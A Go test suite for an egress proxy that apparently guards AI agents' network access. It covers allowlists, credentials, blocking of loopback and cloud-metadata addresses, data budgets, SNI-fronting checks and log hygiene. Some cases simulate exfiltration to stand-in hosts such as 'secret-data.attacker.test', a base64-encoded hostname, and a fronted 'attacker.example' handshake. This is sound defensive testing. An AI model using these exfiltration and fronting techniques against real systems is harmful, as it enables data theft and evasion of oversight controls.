package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"net/url"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/kivali-ai/kivali/internal/clock"
)

// publicIP is where the test names resolve; the test dialer routes it
// to a local listener, so the guard sees a public address.
const publicIP = "203.0.113.7"

type harnessConfig struct {
	allow   []string
	secrets map[string]string
	// shells, agentHosts and exempt go into the agents file beside
	// secrets (agentsFile).
	shells     map[string]string
	agentHosts map[string][]string
	exempt     []string
	modelHosts []string
	limits     budgetLimits
	enforce    bool
	deny       []netip.Prefix
	// maxPerSource caps connections per source IP; 0 means no cap.
	maxPerSource int
}

type harness struct {
	p          *proxy
	srv        *httptest.Server
	res        *fakeResolver
	dialer     *testDialer
	logs       *logSink
	clk        *clock.Fake
	agentsPath string
}

func newHarness(t *testing.T, cfg harnessConfig) *harness {
	t.Helper()
	if cfg.limits == (budgetLimits{}) {
		cfg.limits = budgetLimits{Conn: 32768, TenMin: 262144, Day: 4194304}
	}
	h := &harness{
		res:        &fakeResolver{},
		dialer:     &testDialer{},
		logs:       newLogSink(),
		clk:        clock.NewFake(),
		agentsPath: filepath.Join(t.TempDir(), "agents.json"),
	}
	if cfg.secrets != nil || cfg.shells != nil || cfg.agentHosts != nil || cfg.exempt != nil || cfg.modelHosts != nil {
		writeAgentsFile(t, h.agentsPath, agentsFile{
			secrets:    cfg.secrets,
			shells:     cfg.shells,
			agentHosts: cfg.agentHosts,
			exempt:     cfg.exempt,
			modelHosts: cfg.modelHosts,
		})
	}
	allow := &Allowlist{}
	patterns := append([]string(nil), cfg.allow...)
	allow.patterns.Store(&patterns)
	agents := &Agents{Path: h.agentsPath, Logf: h.logs.logf}
	if err := agents.Load(h.agentsPath); err != nil {
		t.Fatal(err)
	}
	h.p = &proxy{
		allow:  allow,
		agents: agents,
		guard:  &guard{resolver: h.res, dial: h.dialer.dial, deny: cfg.deny},
		budget: newBudget(h.clk, cfg.limits, cfg.enforce, h.logs.logf),
		logf:   h.logs.logf,
	}
	h.srv = httptest.NewUnstartedServer(h.p)
	h.srv.Listener = newSourceLimitListener(h.srv.Listener, cfg.maxPerSource, h.logs.logf)
	h.srv.Start()
	t.Cleanup(h.srv.Close)
	return h
}

// upstream makes name resolve to the public test address and routes
// that address to addr.
func (h *harness) upstream(name, addr string) {
	h.res.set(name, publicIP)
	h.dialer.route(publicIP, addr)
}

// connect sends a CONNECT for target through the proxy, with auth as
// the Proxy-Authorization value when non-empty.
func (h *harness) connect(t *testing.T, target, auth string) (*http.Response, net.Conn, *bufio.Reader) {
	t.Helper()
	conn, err := net.Dial("tcp", h.srv.Listener.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = conn.Close() })
	req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", target, target)
	if auth != "" {
		req += "Proxy-Authorization: " + auth + "\r\n"
	}
	if _, err := io.WriteString(conn, req+"\r\n"); err != nil {
		t.Fatal(err)
	}
	br := bufio.NewReader(conn)
	resp, err := http.ReadResponse(br, &http.Request{Method: http.MethodConnect})
	if err != nil {
		t.Fatalf("CONNECT %s: %v", target, err)
	}
	return resp, conn, br
}

// get sends a plain proxied GET for rawURL, with auth as the
// Proxy-Authorization value when non-empty.
func (h *harness) get(t *testing.T, rawURL, auth string) (*http.Response, string) {
	t.Helper()
	conn, err := net.Dial("tcp", h.srv.Listener.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = conn.Close() }()
	host := strings.SplitN(strings.TrimPrefix(rawURL, "http://"), "/", 2)[0]
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n", rawURL, host)
	if auth != "" {
		req += "Proxy-Authorization: " + auth + "\r\n"
	}
	if _, err := io.WriteString(conn, req+"\r\n"); err != nil {
		t.Fatal(err)
	}
	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		t.Fatalf("GET %s: %v", rawURL, err)
	}
	body, _ := io.ReadAll(resp.Body)
	_ = resp.Body.Close()
	return resp, string(body)
}

// echo writes payload into the tunnel and reads it back.
func echo(t *testing.T, conn net.Conn, br *bufio.Reader, payload []byte) {
	t.Helper()
	if _, err := conn.Write(payload); err != nil {
		t.Fatal(err)
	}
	got := make([]byte, len(payload))
	if _, err := io.ReadFull(br, got); err != nil {
		t.Fatalf("tunnel read: %v", err)
	}
	if string(got) != string(payload) {
		t.Fatalf("tunnel echo = %q", got)
	}
}

// echoServer is a TCP server that echoes everything it reads.
type echoServer struct{ ln net.Listener }

func newEchoServer(t *testing.T) *echoServer {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = ln.Close() })
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go func(c net.Conn) {
				defer func() { _ = c.Close() }()
				_, _ = io.Copy(c, c)
			}(c)
		}
	}()
	return &echoServer{ln: ln}
}

func (e *echoServer) Addr() string { return e.ln.Addr().String() }

// headerServer is an HTTP upstream that records each request's
// headers and path.
type headerServer struct {
	*httptest.Server
	mu      sync.Mutex
	headers []http.Header
}

func newHeaderServer(t *testing.T) *headerServer {
	t.Helper()
	hs := &headerServer{}
	hs.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hs.mu.Lock()
		hs.headers = append(hs.headers, r.Header.Clone())
		hs.mu.Unlock()
		_, _ = fmt.Fprintf(w, "hello %s", r.URL.Path)
	}))
	t.Cleanup(hs.Close)
	return hs
}

func (hs *headerServer) last() http.Header {
	hs.mu.Lock()
	defer hs.mu.Unlock()
	if len(hs.headers) == 0 {
		return nil
	}
	return hs.headers[len(hs.headers)-1]
}

func (hs *headerServer) addr() string { return strings.TrimPrefix(hs.URL, "http://") }

func TestConnectModes(t *testing.T) {
	e := newEchoServer(t)
	h := newHarness(t, harnessConfig{
		allow:   []string{"listed.test"},
		secrets: map[string]string{"alice": "s3cret"},
	})
	h.upstream("listed.test", e.Addr())
	h.upstream("unlisted.test", e.Addr())

	cases := []struct {
		name   string
		target string
		auth   string
		status int
	}{
		{"shell, listed", "listed.test:443", "", 200},
		{"shell, unlisted", "unlisted.test:443", "", 403},
		{"agent, unlisted", "unlisted.test:443", basicAuth("alice", "s3cret"), 200},
		{"agent, listed", "listed.test:443", basicAuth("alice", "s3cret"), 200},
		{"wrong secret", "listed.test:443", basicAuth("alice", "nope"), 407},
		{"unknown slug", "listed.test:443", basicAuth("mallory", "s3cret"), 407},
		{"other scheme", "listed.test:443", "Bearer s3cret", 407},
		{"no secret", "listed.test:443", "Basic " + base64.StdEncoding.EncodeToString([]byte("alice")), 407},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			resp, conn, br := h.connect(t, c.target, c.auth)
			if resp.StatusCode != c.status {
				t.Fatalf("status = %d, want %d", resp.StatusCode, c.status)
			}
			if c.status == 407 && resp.Header.Get("Proxy-Authenticate") != `Basic realm="kivali"` {
				t.Errorf("Proxy-Authenticate = %q", resp.Header.Get("Proxy-Authenticate"))
			}
			if c.status == 200 {
				echo(t, conn, br, []byte("hi\n"))
			}
		})
	}
}

// Allowlist mode refuses an unlisted name before resolving it.
func TestAllowlistChecksBeforeResolving(t *testing.T) {
	h := newHarness(t, harnessConfig{allow: []string{"listed.test"}})
	resp, _, _ := h.connect(t, "secret-data.attacker.test:443", "")
	if resp.StatusCode != 403 {
		t.Fatalf("status = %d", resp.StatusCode)
	}
	r2, body := h.get(t, "http://secret-data.attacker.test/x", "")
	if r2.StatusCode != 403 {
		t.Fatalf("http status = %d", r2.StatusCode)
	}
	// The shell reads the refusal: it names the host and the list and
	// no other way out. run_shell's notice matches its wording
	// (internal/agent's ShellProxyRefusals).
	if want := "secret-data.attacker.test is not on the team's allow list.\n"; body != want {
		t.Errorf("refusal = %q, want %q", body, want)
	}
	if asked := h.res.asked(); len(asked) != 0 {
		t.Fatalf("resolved %v", asked)
	}
}

func TestHTTPModes(t *testing.T) {
	up := newHeaderServer(t)
	h := newHarness(t, harnessConfig{
		allow:   []string{"listed.test"},
		secrets: map[string]string{"alice": "s3cret"},
	})
	h.upstream("listed.test", up.addr())
	h.upstream("unlisted.test", up.addr())

	cases := []struct {
		name   string
		url    string
		auth   string
		status int
	}{
		{"shell, listed", "http://listed.test/ping", "", 200},
		{"shell, unlisted", "http://unlisted.test/ping", "", 403},
		{"agent, unlisted", "http://unlisted.test/ping", basicAuth("alice", "s3cret"), 200},
		{"wrong secret", "http://listed.test/ping", basicAuth("alice", "nope"), 407},
		{"unknown slug", "http://listed.test/ping", basicAuth("mallory", "s3cret"), 407},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			resp, body := h.get(t, c.url, c.auth)
			if resp.StatusCode != c.status {
				t.Fatalf("status = %d, want %d (%s)", resp.StatusCode, c.status, body)
			}
			if c.status == 200 && body != "hello /ping" {
				t.Errorf("body = %q", body)
			}
			if c.status == 407 && resp.Header.Get("Proxy-Authenticate") != `Basic realm="kivali"` {
				t.Errorf("Proxy-Authenticate = %q", resp.Header.Get("Proxy-Authenticate"))
			}
		})
	}
}

// Go's own client, pointed at the proxy with credentials in the proxy
// URL, gets open mode for plain HTTP.
func TestHTTPProxyWithGoClient(t *testing.T) {
	up := newHeaderServer(t)
	h := newHarness(t, harnessConfig{secrets: map[string]string{"alice": "s3cret"}})
	h.upstream("anywhere.test", up.addr())
	proxyURL := mustURL(t, "http://alice:s3cret@"+h.srv.Listener.Addr().String())
	client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)}}
	resp, err := client.Get("http://anywhere.test/ping")
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	_ = resp.Body.Close()
	if resp.StatusCode != 200 || string(body) != "hello /ping" {
		t.Fatalf("status %d body %q", resp.StatusCode, body)
	}
}

// The agent's credentials stop at the proxy.
func TestProxyAuthorizationNotForwarded(t *testing.T) {
	up := newHeaderServer(t)
	h := newHarness(t, harnessConfig{secrets: map[string]string{"alice": "s3cret"}})
	h.upstream("anywhere.test", up.addr())

	conn, err := net.Dial("tcp", h.srv.Listener.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = conn.Close() }()
	_, _ = io.WriteString(conn, "GET http://anywhere.test/x HTTP/1.1\r\nHost: anywhere.test\r\n"+
		"Proxy-Authorization: "+basicAuth("alice", "s3cret")+"\r\n"+
		"Proxy-Connection: keep-alive\r\nConnection: close, X-Hop\r\nX-Hop: 1\r\nX-Kept: 1\r\n\r\n")
	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		t.Fatal(err)
	}
	_ = resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("status = %d", resp.StatusCode)
	}
	got := up.last()
	for _, k := range []string{"Proxy-Authorization", "Proxy-Connection", "X-Hop"} {
		if v := got.Get(k); v != "" {
			t.Errorf("%s forwarded upstream: %q", k, v)
		}
	}
	if got.Get("X-Kept") != "1" {
		t.Errorf("end-to-end header dropped: %v", got)
	}
}

// A pod's first call right after core registers it passes without
// waiting for the watcher, however many bad credentials arrive first.
func TestReloadOnMiss(t *testing.T) {
	e := newEchoServer(t)
	h := newHarness(t, harnessConfig{})
	h.upstream("anywhere.test", e.Addr())
	spam := func() {
		for i := 0; i < 50; i++ {
			if resp, _, _ := h.connect(t, "anywhere.test:443", basicAuth("mallory", "guess")); resp.StatusCode != 407 {
				t.Fatalf("bad credentials: %d", resp.StatusCode)
			}
		}
	}

	spam()
	writeAgents(t, h.agentsPath, map[string]string{"alice": "a"})
	if resp, _, _ := h.connect(t, "anywhere.test:443", basicAuth("alice", "a")); resp.StatusCode != 200 {
		t.Fatalf("first call after registration: %d", resp.StatusCode)
	}
	spam()
	writeAgents(t, h.agentsPath, map[string]string{"alice": "a", "bob": "b"})
	spam()
	if resp, _, _ := h.connect(t, "anywhere.test:443", basicAuth("bob", "b")); resp.StatusCode != 200 {
		t.Fatalf("first call after a second registration, behind bad credentials: %d", resp.StatusCode)
	}
}

func TestProxyRefusesLocalDestinations(t *testing.T) {
	e := newEchoServer(t)
	h := newHarness(t, harnessConfig{
		allow:   []string{"server.test", "127.0.0.1", "169.254.169.254", "pod.test", "intranet.test"},
		secrets: map[string]string{"alice": "s3cret"},
		deny:    mustPrefixes("10.42.0.0/16"),
	})
	h.res.set("server.test", "127.0.0.1")
	h.res.set("pod.test", "10.42.0.9")
	h.res.set("intranet.test", "10.0.0.5")
	h.res.set("private.test", "10.0.0.6")
	for _, ip := range []string{"127.0.0.1", "10.42.0.9", "10.0.0.5", "10.0.0.6"} {
		h.dialer.route(ip, e.Addr())
	}
	agent := basicAuth("alice", "s3cret")

	cases := []struct {
		target string
		auth   string
		status int
	}{
		{"server.test:8080", "", 403},
		{"server.test:8080", agent, 403},
		{"127.0.0.1:8080", "", 403},
		{"127.0.0.1:8080", agent, 403},
		{"169.254.169.254:80", "", 403},
		{"169.254.169.254:80", agent, 403},
		{"[::ffff:127.0.0.1]:8080", agent, 403},
		{"pod.test:443", "", 403},
		{"pod.test:443", agent, 403},
		{"private.test:443", agent, 403},      // unlisted private host, open mode
		{"[::ffff:10.0.0.6]:443", agent, 403}, // the same, as a mapped literal
		{"intranet.test:443", "", 200},        // operators list intranet hosts for shells
		{"intranet.test:443", agent, 200},     // and the agent reaches them too
	}
	for _, c := range cases {
		resp, _, _ := h.connect(t, c.target, c.auth)
		if resp.StatusCode != c.status {
			t.Errorf("CONNECT %s auth=%v: %d, want %d", c.target, c.auth != "", resp.StatusCode, c.status)
		}
	}
	if r, _ := h.get(t, "http://server.test:8080/", agent); r.StatusCode != 403 {
		t.Errorf("plain HTTP to the server pod: %d", r.StatusCode)
	}
	for _, d := range h.dialer.calls() {
		if d != "10.0.0.5:443" {
			t.Errorf("dialled refused address %s", d)
		}
	}
}

// The hostname counts against the budget before the proxy looks it up.
func TestHostnameCountedBeforeResolving(t *testing.T) {
	name := "c2VjcmV0LWRhdGE.attacker.test"
	h := newHarness(t, harnessConfig{secrets: map[string]string{"alice": "s3cret"}})
	resp, _, _ := h.connect(t, name+":443", basicAuth("alice", "s3cret"))
	if resp.StatusCode != http.StatusBadGateway {
		t.Fatalf("unresolvable name: %d", resp.StatusCode)
	}
	if ten, day := h.p.budget.Usage("alice"); ten != int64(len(name)) || day != int64(len(name)) {
		t.Fatalf("usage = %d, %d; want %d", ten, day, len(name))
	}

	enforced := newHarness(t, harnessConfig{
		secrets: map[string]string{"alice": "s3cret"},
		limits:  budgetLimits{Conn: 32768, TenMin: 10, Day: 4194304},
		enforce: true,
	})
	resp, _, _ = enforced.connect(t, name+":443", basicAuth("alice", "s3cret"))
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 403 || !strings.Contains(string(body), budgetRefusal) {
		t.Fatalf("over budget by hostname: %d %q", resp.StatusCode, body)
	}
	if asked := enforced.res.asked(); len(asked) != 0 {
		t.Fatalf("resolved a name over budget: %v", asked)
	}
}

// Model hosts are exempt by exact name only, only once the request
// carries an agent's credentials, and only for a TLS tunnel whose
// ClientHello names the same host: anything else could be fronted to
// another site behind the same CDN.
func TestModelHostExemption(t *testing.T) {
	e := newEchoServer(t)
	newH := func(limits budgetLimits, enforce bool) *harness {
		h := newHarness(t, harnessConfig{
			secrets:    map[string]string{"alice": "s3cret"},
			modelHosts: []string{"api.anthropic.com"},
			limits:     limits,
			enforce:    enforce,
		})
		h.upstream("api.anthropic.com", e.Addr())
		h.upstream("x.api.anthropic.com", e.Addr())
		return h
	}
	agent := basicAuth("alice", "s3cret")
	loose := budgetLimits{Conn: 1 << 30, TenMin: 1 << 30, Day: 1 << 30}
	hostLen := int64(len("api.anthropic.com"))

	t.Run("matching SNI is exempt", func(t *testing.T) {
		h := newH(budgetLimits{Conn: 4, TenMin: 4, Day: 4}, true)
		hello := realClientHello(t, "api.anthropic.com")
		resp, conn, br := h.connect(t, "API.Anthropic.com:443", agent)
		if resp.StatusCode != 200 {
			t.Fatalf("model host: %d", resp.StatusCode)
		}
		echo(t, conn, br, hello) // the peeked record reaches upstream intact
		echo(t, conn, br, []byte(strings.Repeat("m", 1000)))
		if ten, day := h.p.budget.Usage("alice"); ten != 0 || day != 0 {
			t.Fatalf("model host counted: %d, %d", ten, day)
		}
	})

	for name, first := range map[string][]byte{
		"other SNI": realClientHello(t, "attacker.example"),
		"no SNI":    realClientHello(t, ""),
		"ECH":       buildHello(sniExt(0, "api.anthropic.com"), ext(tlsExtECH, []byte{1})),
		"not TLS":   []byte("GET / HTTP/1.1\r\nHost: attacker.example\r\n\r\n"),
	} {
		t.Run(name+" is counted", func(t *testing.T) {
			h := newH(loose, false)
			resp, conn, br := h.connect(t, "api.anthropic.com:443", agent)
			if resp.StatusCode != 200 {
				t.Fatalf("status %d", resp.StatusCode)
			}
			echo(t, conn, br, first)
			echo(t, conn, br, []byte("more"))
			if ten, _ := h.p.budget.Usage("alice"); ten != hostLen+int64(len(first))+4 {
				t.Fatalf("usage = %d, want %d", ten, hostLen+int64(len(first))+4)
			}
			if got := h.logs.matching("COUNT agent=alice mode=open host=api.anthropic.com:443 reason=sni"); len(got) != 1 {
				t.Fatalf("log = %q", h.logs.all())
			}
		})
	}

	t.Run("fronted tunnel of a held agent closes", func(t *testing.T) {
		h := newH(budgetLimits{Conn: 1 << 30, TenMin: 4, Day: 1 << 30}, true)
		resp, conn, br := h.connect(t, "api.anthropic.com:443", agent)
		if resp.StatusCode != 200 {
			t.Fatalf("status %d", resp.StatusCode)
		}
		if _, err := conn.Write(realClientHello(t, "attacker.example")); err != nil {
			t.Fatal(err)
		}
		if n, err := br.Read(make([]byte, 1)); err == nil {
			t.Fatalf("tunnel stayed open, read %d", n)
		}
		if got := h.logs.matching("DENY agent=alice mode=open host=api.anthropic.com:443 reason=budget"); len(got) != 1 {
			t.Fatalf("log = %q", h.logs.all())
		}
	})

	t.Run("plain HTTP to a model host is counted", func(t *testing.T) {
		up := newHeaderServer(t)
		h := newH(loose, false)
		h.dialer.route(publicIP, up.addr())
		if r, _ := h.get(t, "http://api.anthropic.com/", agent); r.StatusCode != 200 {
			t.Fatalf("status %d", r.StatusCode)
		}
		if ten, _ := h.p.budget.Usage("alice"); ten <= hostLen {
			t.Fatalf("usage = %d", ten)
		}
	})

	t.Run("credentials required", func(t *testing.T) {
		h := newH(loose, false)
		if resp, _, _ := h.connect(t, "api.anthropic.com:443", ""); resp.StatusCode != 403 {
			t.Fatalf("model host without credentials, not on the allowlist: %d", resp.StatusCode)
		}
	})

	t.Run("subdomain counted", func(t *testing.T) {
		h := newH(budgetLimits{Conn: 4, TenMin: 4, Day: 4}, true)
		resp, _, _ := h.connect(t, "x.api.anthropic.com:443", agent)
		if resp.StatusCode != 403 {
			t.Fatalf("subdomain of a model host exempted: %d", resp.StatusCode)
		}
		if ten, _ := h.p.budget.Usage("alice"); ten != int64(len("x.api.anthropic.com")) {
			t.Fatalf("subdomain not counted: %d", ten)
		}
	})
}

// Bytes sent up a tunnel count as they pass; one line at close gives
// the totals.
func TestTunnelCountedLiveAndLogged(t *testing.T) {
	e := newEchoServer(t)
	h := newHarness(t, harnessConfig{secrets: map[string]string{"alice": "s3cret"}})
	h.upstream("site.test", e.Addr())

	resp, conn, br := h.connect(t, "site.test:443", basicAuth("alice", "s3cret"))
	if resp.StatusCode != 200 {
		t.Fatal(resp.StatusCode)
	}
	echo(t, conn, br, []byte("12345"))
	if ten, _ := h.p.budget.Usage("alice"); ten != int64(len("site.test")+5) {
		t.Fatalf("live usage = %d, want hostname + 5", ten)
	}
	_ = conn.Close()
	if got := h.logs.next(t, "CONN"); got != "CONN agent=alice mode=open host=site.test:443 up=5 down=5" {
		t.Fatalf("close line = %q", got)
	}
}

func TestPerConnectionCap(t *testing.T) {
	for _, enforce := range []bool{false, true} {
		t.Run(fmt.Sprintf("enforce=%v", enforce), func(t *testing.T) {
			e := newEchoServer(t)
			h := newHarness(t, harnessConfig{
				secrets: map[string]string{"alice": "s3cret"},
				limits:  budgetLimits{Conn: 100, TenMin: 1 << 30, Day: 1 << 30},
				enforce: enforce,
			})
			h.upstream("site.test", e.Addr())
			resp, conn, br := h.connect(t, "site.test:443", basicAuth("alice", "s3cret"))
			if resp.StatusCode != 200 {
				t.Fatal(resp.StatusCode)
			}
			echo(t, conn, br, make([]byte, 60))
			if _, err := conn.Write(make([]byte, 60)); err != nil {
				t.Fatal(err)
			}
			// The second write may reach the proxy in more than one read,
			// so the crossing total is anywhere past the cap.
			over := h.logs.next(t, "OVER")
			if !strings.HasPrefix(over, "OVER agent=alice limit=conn bytes=1") ||
				!strings.HasSuffix(over, fmt.Sprintf(" host=site.test:443 enforced=%t", enforce)) {
				t.Fatalf("OVER = %q", over)
			}
			if enforce {
				// The proxy closes the tunnel: the read ends without the echo.
				if n, err := io.ReadFull(br, make([]byte, 60)); err == nil {
					t.Fatalf("tunnel still open, read %d", n)
				}
				if line := h.logs.next(t, "CONN"); !strings.HasPrefix(line, "CONN agent=alice mode=open host=site.test:443 up=") {
					t.Fatalf("close line = %q", line)
				}
				return
			}
			got := make([]byte, 60)
			if _, err := io.ReadFull(br, got); err != nil {
				t.Fatalf("unenforced tunnel closed: %v", err)
			}
		})
	}
}

// With enforcement on, crossing a window holds the agent: its next
// open-mode connection is refused; the shell is unaffected. With it
// off the crossing is logged and nothing is refused.
func TestWindowEnforcement(t *testing.T) {
	for _, enforce := range []bool{false, true} {
		t.Run(fmt.Sprintf("enforce=%v", enforce), func(t *testing.T) {
			e := newEchoServer(t)
			h := newHarness(t, harnessConfig{
				allow:   []string{"site.test"},
				secrets: map[string]string{"alice": "s3cret", "bob": "b"},
				limits:  budgetLimits{Conn: 1 << 30, TenMin: 100, Day: 1 << 30},
				enforce: enforce,
			})
			h.upstream("site.test", e.Addr())
			resp, conn, br := h.connect(t, "site.test:443", basicAuth("alice", "s3cret"))
			if resp.StatusCode != 200 {
				t.Fatal(resp.StatusCode)
			}
			echo(t, conn, br, make([]byte, 200))
			if over := h.logs.next(t, "OVER"); !strings.HasPrefix(over, "OVER agent=alice limit=10m bytes=") ||
				!strings.HasSuffix(over, fmt.Sprintf(" host=site.test:443 enforced=%t", enforce)) {
				t.Fatalf("OVER = %q", over)
			}

			resp, _, _ = h.connect(t, "site.test:443", basicAuth("alice", "s3cret"))
			if enforce {
				body, _ := io.ReadAll(resp.Body)
				if resp.StatusCode != 403 || !strings.Contains(string(body), budgetRefusal) {
					t.Fatalf("held agent: %d %q", resp.StatusCode, body)
				}
			} else if resp.StatusCode != 200 {
				t.Fatalf("unenforced: %d", resp.StatusCode)
			}
			if enforce {
				if r, _ := h.get(t, "http://site.test/", basicAuth("alice", "s3cret")); r.StatusCode != 403 {
					t.Fatalf("held agent over plain HTTP: %d", r.StatusCode)
				}
			}
			if r, _, _ := h.connect(t, "site.test:443", basicAuth("bob", "b")); r.StatusCode != 200 {
				t.Fatalf("another agent: %d", r.StatusCode)
			}
			if r, _, _ := h.connect(t, "site.test:443", ""); r.StatusCode != 200 {
				t.Fatalf("the shell: %d", r.StatusCode)
			}
		})
	}
}

// Logs carry hosts and counts, never credentials or a URL's path or
// query.
func TestLogsCarryNothingSecret(t *testing.T) {
	up := newHeaderServer(t)
	secret := "top-secret-value"
	h := newHarness(t, harnessConfig{
		allow:   []string{"listed.test"},
		secrets: map[string]string{"alice": secret},
	})
	h.upstream("listed.test", up.addr())

	good := basicAuth("alice", secret)
	bad := basicAuth("alice", secret+"x")
	slugless := "Basic " + base64.StdEncoding.EncodeToString([]byte(secret))
	h.get(t, "http://listed.test/private/path?token=qwerty", good)
	h.get(t, "http://listed.test/private/path?token=qwerty", "")
	h.get(t, "http://unlisted.test/private/path?token=qwerty", "")
	h.get(t, "http://listed.test/private/path?token=qwerty", bad)
	h.connect(t, "listed.test:443", bad)
	h.connect(t, "listed.test:443", slugless)
	h.logs.next(t, "CONN")
	h.logs.next(t, "CONN")

	lines := h.logs.all()
	if len(lines) == 0 {
		t.Fatal("no log lines")
	}
	for _, line := range lines {
		for _, leak := range []string{secret, good, bad, slugless, "private", "token", "qwerty"} {
			if strings.Contains(line, leak) {
				t.Errorf("log line %q contains %q", line, leak)
			}
		}
	}
	if got := h.logs.matching("CONN agent=alice mode=open host=listed.test:80 "); len(got) != 1 {
		t.Errorf("open-mode close line missing: %q", lines)
	}
	if got := h.logs.matching("CONN agent=- mode=allowlist host=listed.test:80 "); len(got) != 1 {
		t.Errorf("allowlist-mode close line missing: %q", lines)
	}
}

func mustURL(t *testing.T, raw string) *url.URL {
	t.Helper()
	u, err := url.Parse(raw)
	if err != nil {
		t.Fatal(err)
	}
	return u
}
